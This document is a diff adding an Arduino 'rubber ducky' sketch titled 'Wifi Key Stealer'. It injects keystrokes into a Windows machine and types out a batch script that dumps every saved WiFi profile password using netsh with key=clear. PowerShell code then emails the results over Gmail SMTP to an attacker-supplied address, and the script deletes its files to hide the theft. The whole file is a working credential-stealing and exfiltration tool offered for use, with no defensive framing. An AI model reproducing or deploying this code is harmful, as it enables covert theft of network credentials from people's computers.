@@ -1,0 +1,256 @@
+/*
+ * Title : Wifi Key Stealer 
+ * Description : steal all wifi profiles from windows machine using rubber ducky key stroke injection
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+ 
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("powershell");
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.print("notepad.exe wkg.bat");
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  typeKey(KEY_RETURN);
+  delay(500);
+
+  Keyboard.print("@echo off");
+  typeKey(KEY_RETURN);
+  
+  Keyboard.print("setlocal enabledelayedexpansion");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(":main");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("call :get-profiles r");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(":main-next-profile");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       for /f \"tokens=1* delims=,\" %%a in (\"%r%\") do (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("           call :get-profile-key \"%%a\" key");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("           if \"!key!\" NEQ \"\" (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("               echo WiFi: [%%a] Password: [!key!] >> keys");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("           )");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("           set r=%%b");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       )");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       if \"%r%\" NEQ \"\" goto main-next-profile");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   echo.");
+  typeKey(KEY_RETURN);
+
+  
+
+  Keyboard.print("   goto :eof");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(":get-profile-key <1=profile-name> <2=out-profile-key>");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   setlocal");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   set result=");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   FOR /F \"usebackq tokens=2 delims=:\" %%a in (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       `netsh wlan show profile name^=\"%~1\" key^=clear ^| findstr /C:\"Key Content\"`) DO (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       set result=%%a");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       set result=!result:~1!");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   )");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       endlocal");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       set %2=%result%");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   )");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   goto :eof");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(":get-profiles <1=result-variable>");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   setlocal");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   set result=");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   FOR /F \"usebackq tokens=2 delims=:\" %%a in (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       `netsh wlan show profiles ^| findstr /C:\"All User Profile\"`) DO (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       set val=%%a");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       set val=!val:~1!");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       set result=%!val!,!result!");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   )");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   (");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       endlocal");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("       set %1=%result:~0,-1%");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   )");
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("   goto :eof");
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+
+  delay(50);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(50);
+
+  Keyboard.print("./wkg.bat");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  typeKey(KEY_RETURN);
+
+ 
+  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.EnableSsl = $true");
+
+  typeKey(KEY_RETURN);
+
+  // --> Google account login, password must start with a lowercase letter
+  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR ACCOUNT@gmail.com', 'PASSWORD')");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.From = 'YOUR ACCOUNT@gmail.com'");
+
+  typeKey(KEY_RETURN);
+
+  // --> Log receiver
+  Keyboard.print("$ReportEmail.To.Add('RECIVER@gmail.com')");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.Subject = 'WiFi key grabber'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.Body = (Get-Content keys | out-string)");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("del wkg.bat");
+  typeKey(KEY_RETURN);
+  Keyboard.print("del keys");
+  typeKey(KEY_RETURN);
+  Keyboard.print("exit");
+  typeKey(KEY_RETURN);
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
